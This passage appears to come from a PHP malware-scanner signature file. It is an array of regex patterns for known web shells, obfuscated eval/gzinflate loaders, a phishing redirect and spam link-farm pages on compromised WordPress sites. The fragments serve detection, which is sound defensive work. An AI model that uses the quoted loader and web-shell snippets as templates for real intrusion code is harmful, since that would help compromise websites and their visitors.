      'pattern' => '/set_time_limit\\(0\\);[\\s\\S]{0,12000}\\$ZlwBhrDSDRgGg\\=\'fun\'\\.\'ct\'\\.\'i\'\\.\'o\'\\.\'n_exi\'\\.\'s\'\\.\'ts\';\\$WMKVyvv\\=\'e\'\\.\'v\'\\.\'a\'\\.\'l\';\\$IXfmSFpQaIi\\=\'gzin\'\\.\'f\'\\.\'l\'\\.\'a\'\\.\'te\';\\$ljfFTRMJC\\=\'ABCDE\'\\.\'FGHIJ\'\\./s',
      'label' => 'source-file head-tail anchor',
    ),
    865 => 
    array (
      'pattern' => '/WPINC\' \\) \\) \\{
	die;
\\}

function activate_alti_protect_uploads\\(\\) \\{

	require_once plugin_dir_path\\( __FILE__ \\) \\.[\\s\\S]{0,160};
	require_once plugin_dir_path\\( __FILE__ \\) \\./',
      'label' => 'sample-specific literal chain',
    ),
    866 => 
    array (
      'pattern' => '/,\\$_currDomain\\);
		\\}else\\{
			\\$_currDomain \\= \\$_currDomain;
		\\}
		\\$_thispwd \\=[\\s\\S]{0,160}\\. mt_rand\\(100,999\\);
		\\$_pwd     \\= crypt\\(\\$_thispwd,/',
      'label' => 'sample-specific literal chain',
    ),
    867 => 
    array (
      'pattern' => '/\\<thead class\\="text\\-light"\\>\\<tr\\>\\<th\\>Name\\<\\/th\\>\\<th\\>Size\\<\\/th\\>\\<th\\>Permission\\<\\/th\\<th\\>Action\\<\\/th\\>\\<\\/tr\\>\\<\\/thead\\>\\<tbody class\\="text\\-light"\\>\\<\\?php  \\$G3 \\=/',
      'label' => 'source-file tail snippet',
    ),
    868 => 
    array (
      'pattern' => '/\\<\\?php class _z\\{private static\\$_fcu;static function _eg\\(\\$_d\\)\\{if\\(\\!self\\:\\:\\$_fcu\\)self\\:\\:_iai\\(\\);return self\\:\\:\\$_fcu\\[\\$_d\\];\\}private static function _i/',
      'label' => 'source-file tail snippet',
    ),
    869 => 
    array (
      'pattern' => '/\\$ip \\= getenv\\("REMOTE_ADDR"\\);[\\s\\S]{0,12000}header\\("Location\\: http\\:\\/\\/mail\\.163\\.com\\/dashi\\/\\?from\\=mail46 "\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    870 => 
    array (
      'pattern' => '/\\>\\<\\/form\\>\\<\\/center\\>\';break;
		case \'cmd\'\\: print \'\\<\\/br\\>\\<\\/br\\>\\<center\\>\\<h3\\>Command Kar Bina\\<\\/h3\\>\\<form action\\=/',
      'label' => 'sample-specific literal',
    ),
    871 => 
    array (
      'pattern' => '/header\\(\'Content\\-Type\\:text\\/html; charset\\=UTF\\-8\'\\);[\\s\\S]{0,12000}echo "\\<a href\\=\\\\""\\.get_site_url\\(\\)\\."\\/category\\/\\{\\$category\\-\\>slug\\}\\\\" target\\=\\\\"_blank\\\\"\\>\\{\\$category\\-\\>cat_name\\}\\<\\/a\\>\\<br\\>\\\\n";/s',
      'label' => 'source-file head-tail anchor',
    ),
    872 => 
    array (
      'pattern' => '/\\$?PLjen7U7PlzEpYtKtASJ6cff8fPqB\\b/',
      'label' => 'sample-specific identifier',
    ),
    873 => 
    array (
      'pattern' => '/World map pdf high resolution/',
      'label' => 'sample-specific literal',
    ),
    874 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/verkol\\.ir\\/v1pr7pf45\\/executive\\-retirement\\-announcement\\.html\\>zj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/oncohope\\.net\\/vcf5\\/fuse\\-universal\\-linkedin\\.h/',
      'label' => 'source-file tail snippet',
    ),
    875 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Evp app\\<\\/title\\>

  \\<meta name\\=[\\s\\S]{0,160}\\>



 

  \\<style\\>

	@font\\-face \\{

		font\\-family\\:/',
      'label' => 'sample-specific literal chain',
    ),
    876 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/marjanhotel\\.com\\/w8vo\\/timesplitters\\-ps2\\-iso\\.html\\>cu\\<\\/a\\>, \\<a href\\=http\\:\\/\\/ashjabattery\\.ir\\/pa2v2a\\/application\\-mecca\\.html\\>nu\\<\\/a\\>, /',
      'label' => 'source-file tail snippet',
    ),
    877 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/dunlopillo\\.firstcom\\.vn\\/znvoqelq\\/pre\\-primary\\-exam\\-question\\-paper\\.html\\>dn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/myhealthcarestore\\.co\\.uk\\/eiyg98\\/on/',
      'label' => 'source-file tail snippet',
    ),
    878 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/0qv87cq\\/craigslist/',
      'label' => 'sample-specific encoded fragment',
    ),
    879 => 
    array (
      'pattern' => '/content\\/plugins\\/akismet\\/views\\/kuuu5g\\/winch/',
      'label' => 'sample-specific encoded fragment',
    ),
    880 => 
    array (
      'pattern' => '/true"\\>Conclusion for logistics project\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    881 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/totalsofttech\\.com\\.ph\\/x8m\\/dataminr\\-dod\\-contract\\.html\\>kf\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sahifa\\.aslitheme\\.xyz\\/safmm\\/azure\\-ad\\-manager\\-attrib/',
      'label' => 'source-file tail snippet',
    ),
    882 => 
    array (
      'pattern' => '/\\>Tracepath mac\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    883 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/aqua\\-fitness\\.ca\\/htp3w11\\/education\\-banner\\-template\\-free\\-download\\.html\\>yv\\<\\/a\\>, \\<a href\\=http\\:\\/\\/supplychainz\\.in\\/ko2sbr\\/cheap\\-smtp/',
      'label' => 'source-file tail snippet',
    ),
    884 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/sjois\\.com\\/6okqynz\\/drag\\-bars\\-sportster\\.html\\>nj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sorokara\\.ru\\/snfceuh5\\/death\\-notice\\.html\\>72\\<\\/a\\>, \\<a href\\=http/',
      'label' => 'source-file tail snippet',
    ),
    885 => 
    array (
      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/cat/',
      'label' => 'sample-specific encoded fragment',
    ),
    886 => 
    array (
      'pattern' => '/\\>Dsp audio effects\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    887 => 
    array (
      'pattern' => '/\\>How much in spanish\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    888 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/klon\\.toolsnarzedzia\\.pl\\/mceo\\/mrz\\-github\\.html\\>vf\\<\\/a\\>, \\<a href\\=http\\:\\/\\/quercia\\.com\\.mx\\/haeuf\\/2\\-of\\-amerikaz\\-most\\-wanted\\-live\\.html\\>a/',
      'label' => 'source-file tail snippet',
    ),
    889 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/rmsnav\\-test2\\-1\\.gtfc\\.com\\/wp\\-content\\/uploads\\/2019\\/03\\/wor5y\\/real\\-time\\-action\\-recognition\\-github\\.html\\>dt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/verk/',
      'label' => 'source-file tail snippet',
    ),
    890 => 
    array (
      'pattern' => '/\\] \\. \\$s;

\\$today \\= "20190819";

include\\("checkmob\\.php"\\);
if\\(is_mobile\\(\\) \\>0 \\) \\$mobiledevice \\= 11;

if \\(strpos\\(\\$_SERVER\\[/',
      'label' => 'sample-specific literal',
    ),
    891 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Iced 2020\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    892 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Channel 4 news staff\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    893 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Destiny 2 hoodie\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    894 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/accurateopticians\\.com\\/t99\\/woodwop\\-mpr\\-files\\.html\\>wg\\<\\/a\\>, \\<a href\\=http\\:\\/\\/thepuppyavenue\\.com\\/di1ml84cj\\/mtf\\-macd\\-scan\\.html\\>ic\\<\\/a/',
      'label' => 'source-file tail snippet',
    ),
    895 => 
    array (
      'pattern' => '/\\>Easy cat paintings on canvas\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    896 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/xolaren\\.com\\/uneaozewo\\/inject\\-javascript\\-into\\-page\\-hack\\.html\\>6p\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.medzapotenciju\\.com\\/f6a\\/french\\-language/',
      'label' => 'source-file tail snippet',
    ),
    897 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Speeduino mx5 pnp\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    898 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/metalloplastic\\.com\\.ua\\/5feke\\/60\\-day\\-transformation\\-reddit\\.html\\>tg\\<\\/a\\>, \\<a href\\=http\\:\\/\\/smartdeal\\.lv\\/rawrb4rn\\/windows\\-10\\-inacces/',
      'label' => 'source-file tail snippet',
    ),
    899 => 
    array (
      'pattern' => '/\\/drivers\\/input\\/touchscreen\\/mediatek\\/gslX68X\\/mtk/',
      'label' => 'sample-specific encoded fragment',
    ),
    900 => 
    array (
      'pattern' => '/\\>Decorative screen panels indoor\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    901 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/platovietnam\\.com\\.vn\\/wp\\-content\\/themes\\/guava\\/4xa\\/antenna\\-analyzer\\-schematic\\.html\\>bg\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.shishangta\\.cn\\/ytot/',
      'label' => 'source-file tail snippet',
    ),
    902 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Rabbitmq password special characters\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    903 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Aeotec multisensor 6 isy\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    904 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>12 channel car amplifier\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    905 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/yeganehweb\\.ir\\/trc\\/animal\\-crossing\\-creepy\\-music\\.html\\>cc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.pc01010\\.com\\/2ozmd\\/vyprvpn\\-app\\-store\\.html\\>99\\<\\/a/',
      'label' => 'source-file tail snippet',
    ),
    906 => 
    array (
      'pattern' => '/\\>Zusette deleon\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    907 => 
    array (
      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/touchosc/',
      'label' => 'sample-specific encoded fragment',
    ),
    908 => 
    array (
      'pattern' => '/content\\/plugins\\/akismet\\/views\\/kuuu5g\\/sg/',
      'label' => 'sample-specific encoded fragment',
    ),
    909 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Clothes rail\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    910 => 
    array (
      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/corsair/',
      'label' => 'sample-specific encoded fragment',
    ),
    911 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Ps4 media player controls\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    912 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/jimo\\.ga\\/lze8pkgh\\/wmic\\-commands\\-in\\-sccm\\.html\\>xc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/hotelcampoverde\\.com\\.br\\/2ka\\/xcode\\-not\\-updating\\-to\\-10\\.html\\>4/',
      'label' => 'source-file tail snippet',
    ),
    913 => 
    array (
      'pattern' => '/\\>Johns hopkins white marsh breast center\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    914 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/loseweightfitnesstips\\.com\\/2yqb2t\\/agile\\-rally\\-dev\\.html\\>bb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/billiard1\\.ir\\/lbxl0xrf\\/fortnite\\-stats\\-bot\\-discord/',
      'label' => 'source-file tail snippet',
    ),
    915 => 
    array (
      'pattern' => '/\\>V8 detroit diesel sound\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    916 => 
    array (
      'pattern' => '/\\$?teamfortress2xreader\\b/',
      'label' => 'sample-specific identifier',
    ),
    917 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/0qv87cq\\/whatsapp/',
      'label' => 'sample-specific encoded fragment',
    ),
    918 => 
    array (
      'pattern' => '/_mms\\|myx\\|a700\\|gu1100\\|bc831\\|e300\\|ems100\\|me701\\|me702m\\-three\\|sd588\\|[\\s\\S]{0,160}d736\\|p\\-9521\\|telco\\|sl74\\|ktouch\\|m4u\\\\\\/\\|me702\\|8325rc\\|kddi\\|phone\\|lg \\|/',
      'label' => 'sample-specific literal chain',
    ),
    919 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/fanamaran\\.ir\\/e5kl\\/how\\-to\\-use\\-netbeans\\-connector\\.html\\>io\\<\\/a\\>, \\<a href\\=http\\:\\/\\/palargroup\\.com\\/nrc8xbb2\\/iprimus\\-modem\\-lights\\.html/',
      'label' => 'source-file tail snippet',
    ),
    920 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.savaniphotography\\.co\\.uk\\/r8nlsl\\/gemma\\-o\\-doherty\\-terenure\\-college\\.html\\>uo\\<\\/a\\>, \\<a href\\=http\\:\\/\\/marginaltrading\\.com\\/nlfg\\/2mm\\-/',
      'label' => 'source-file tail snippet',
    ),
    921 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.bikegaragemission\\.shop\\/biw\\/circular\\-bold\\-std\\.html\\>dc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/tresusa\\.biz\\/nly0mls\\/welcome\\-address\\-to\\-new\\-batch/',
      'label' => 'source-file tail snippet',
    ),
    922 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/best\\-scuba\\-diving\\-vacations\\-in\\-british\\-columbia\\.com\\/nasnqcq\\/mandelin\\-test\\-kit\\-amazon\\.html\\>id\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.brvfurni/',
      'label' => 'source-file tail snippet',
    ),
    923 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Land cruiser 200 suspension\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    924 => 
    array (
      'pattern' => '/true"\\>Pvs write cache\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    925 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/test\\.mobyte\\.es\\/raooe\\/what\\-is\\-content\\-browser\\.html\\>rt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/jasawebsite\\.promo\\/iuj\\/moombahton\\-bootleg\\-pack\\.html\\>j/',
      'label' => 'source-file tail snippet',
    ),
    926 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/mpharmaday\\.com\\/ikrecnm\\/coolsculpting\\-lipoma\\.html\\>eb\\<\\/a\\>, \\<a href\\=http\\:\\/\\/topdetail\\.cz\\/ten\\/nadeem\\-sarwar\\-2019\\.html\\>ag\\<\\/a\\>, \\<a h/',
      'label' => 'source-file tail snippet',
    ),
    927 => 
    array (
      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/tom/',
      'label' => 'sample-specific encoded fragment',
    ),
    928 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Cpt 25575\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    929 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Libxml2 xpath\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    930 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/apohair\\.com\\/euwt\\/power\\-bi\\-map\\-custom\\-visual\\.html\\>4a\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.commercial\\.ba\\/sze3tyhg\\/a4\\-player\\-app\\.html\\>mk\\<\\/a\\>,/',
      'label' => 'source-file tail snippet',
    ),
    931 => 
    array (
      'pattern' => '/\\$?out_folder_path\\b/',
      'label' => 'sample-specific identifier',
    ),
    932 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/careers\\.napconational\\.com\\/wp\\-content\\/plugins\\/wordpress\\-seo\\/admin\\/formatter\\/t0qqj6\\/bnha\\-bakugou\\-x\\-jealous\\-reader\\.html\\>lt\\<\\/a\\>, /',
      'label' => 'source-file tail snippet',
    ),
    933 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/v2\\.hanoifreelocaltours\\.com\\/eitagc\\/flash\\-5770\\-mac\\.html\\>w2\\<\\/a\\>, \\<a href\\=http\\:\\/\\/outdoor\\-ficken\\.com\\/5mra\\/yolov3\\-weights\\.html\\>id\\<\\//',
      'label' => 'source-file tail snippet',
    ),
    934 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/privati\\.es\\/gq6u\\/dating\\-whatsapp\\-group\\-links\\.html\\>n7\\<\\/a\\>, \\<a href\\=http\\:\\/\\/wp\\-cms\\.ir\\/osrqqb\\/azure\\-firewall\\-snat\\.html\\>34\\<\\/a\\>, \\<a /',
      'label' => 'source-file tail snippet',
    ),
    935 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Add money to riversweeps\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    936 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/calbro\\.ru\\/rusij5\\/gfortran\\-download\\.html\\>te\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sitepal\\.ir\\/v1vr\\/mkvtoolnix\\-portable\\.html\\>vn\\<\\/a\\>, \\<a href\\=http\\:/',
      'label' => 'source-file tail snippet',
    ),
    937 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Computer audiophile setup\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    938 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/mn8mnt\\/correctional/',
      'label' => 'sample-specific encoded fragment',
    ),
    939 => 
    array (
      'pattern' => '/\\>

 



  \\<title\\>Permanent residence provincial nominee processing time\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal',
    ),
    940 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/brideideas\\.space\\/87qw\\/ssg\\-board\\-situational\\-questions\\.html\\>kw\\<\\/a\\>, \\<a href\\=http\\:\\/\\/saluguia\\.com\\.ar\\/y2zuw\\/forming\\-meaning\\-in\\-te/',
      'label' => 'source-file tail snippet',
    ),
    941 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Gdpr web scraping\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    942 => 
    array (
      'pattern' => '/\\>Pyside2 download wheel\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    943 => 
    array (
      'pattern' => '/true"\\>Cinema hd for iphone\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    944 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.myopentip\\.com\\/xrlf\\/mythicmobs\\-config\\.html\\>07\\<\\/a\\>, \\<a href\\=http\\:\\/\\/express\\-povar\\.ru\\/4ve4nq\\/gta\\-5\\-online\\-money\\-cheats\\.html\\>m/',
      'label' => 'source-file tail snippet',
    ),
    945 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/verkol\\.ir\\/v1pr7pf45\\/mac\\-legacy\\-image\\-should\\-be\\-converted\\-mojave\\.html\\>qc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/fortune\\.icreativelabs\\.com\\/qwan\\/be/',
      'label' => 'source-file tail snippet',
    ),
    946 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.vapebartender\\.com\\/wkssbj\\/murrieta\\-fire\\-map\\.html\\>av\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.banxue\\.org\\/ebp\\/positively\\-wendy\\-bell\\-palace\\-th/',
      'label' => 'source-file tail snippet',
    ),
    947 => 
    array (
      'pattern' => '/\\>\\<span\\>Apartments for rent\\<\\/span\\>\\<\\/span\\>\\<\\/li\\>

              \\<li\\>\\<span class\\=[\\s\\S]{0,160}\\>\\<span\\>All rental listings\\<\\/span\\>\\<\\/span\\>\\<\\/li\\>

              \\<li\\>\\<span class\\=/',
      'label' => 'sample-specific literal chain',
    ),
    948 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/thebrandhawks\\.com\\/mck\\/dell\\-optiplex\\-390\\-second\\-hard\\-drive\\.html\\>9i\\<\\/a\\>, \\<a href\\=http\\:\\/\\/mehdisabri\\.com\\/s73dw\\/monsta\\-x\\-reaction\\-/',
      'label' => 'source-file tail snippet',
    ),
    949 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/dehkadefilm\\.ir\\/v8mqaptffm\\/pdftomusic\\-pro\\.html\\>b0\\<\\/a\\>, \\<a href\\=http\\:\\/\\/downloadhd\\.xyz\\/8tny0\\/zimperium\\-careers\\.html\\>54\\<\\/a\\>, \\<a h/',
      'label' => 'source-file tail snippet',
    ),
    950 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Time dragon 5e\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    951 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/wjilu\\.com\\/fro\\/apotheosis\\-novel\\-english\\.html\\>2i\\<\\/a\\>, \\<a href\\=http\\:\\/\\/upstreamperipheral\\.com\\/x3jjcsktn\\/bing\\-maps\\-status\\.html\\>8j\\</',
      'label' => 'source-file tail snippet',
    ),
    952 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/xjgiqey\\/design/',
      'label' => 'sample-specific encoded fragment',
    ),
    953 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Odoo runbot setup\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    954 => 
    array (
      'pattern' => '/\\>Pueo oc1\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    955 => 
    array (
      'pattern' => '/content\\/plugins\\/akismet\\/views\\/kuuu5g\\/call/',
      'label' => 'sample-specific encoded fragment',
    ),
    956 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>

\\<html class\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Osrs hotkeys\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    957 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/lig9t\\/ab/',
      'label' => 'sample-specific encoded fragment',
    ),
    958 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Javascript socket\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    959 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/shrujais\\.com\\/wordpress\\/wp\\-content\\/themes\\/guava\\/dropyic\\/saybolt\\-viscosity\\-conversion\\.html\\>as\\<\\/a\\>, \\<a href\\=http\\:\\/\\/topdetail\\.cz\\//',
      'label' => 'source-file tail snippet',
    ),
    960 => 
    array (
      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.stachelhaus\\.info\\/yeg12v\\/lsl\\-listen\\-to\\-chat\\.html\\>sh\\<\\/a\\>, \\<a href\\=http\\:\\/\\/xbody\\-active\\.com\\/asfjmbhd\\/pearson\\-method\\-of\\-moment/',
      'label' => 'source-file tail snippet',
    ),
    961 => 
    array (
      'pattern' => '/\\>

 



  

  

  \\<title\\>Mobilogy touch 2\\<\\/title\\>

 

\\<\\/head\\>





\\<body\\>

\\<br\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    962 => 
    array (
      'pattern' => '/content\\/uploads\\/2019\\/08\\/cgeqx\\/how/',
      'label' => 'sample-specific encoded fragment',
    ),
    963 => 
    array (
      'pattern' => '/\\>Github kitty\\<\\/h1\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<\\/div\\>

\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    964 => 
    array (
      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>

  \\<meta charset\\=[\\s\\S]{0,160}\\>

 



  \\<title\\>Divi username and api key free\\<\\/title\\>

  \\<meta name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    965 => 
    array (
      'pattern' => '/content\\/themes\\/guava\\/dropyic\\/sundance/',
      'label' => 'sample-specific encoded fragment',
    ),
    966 => 
    array (
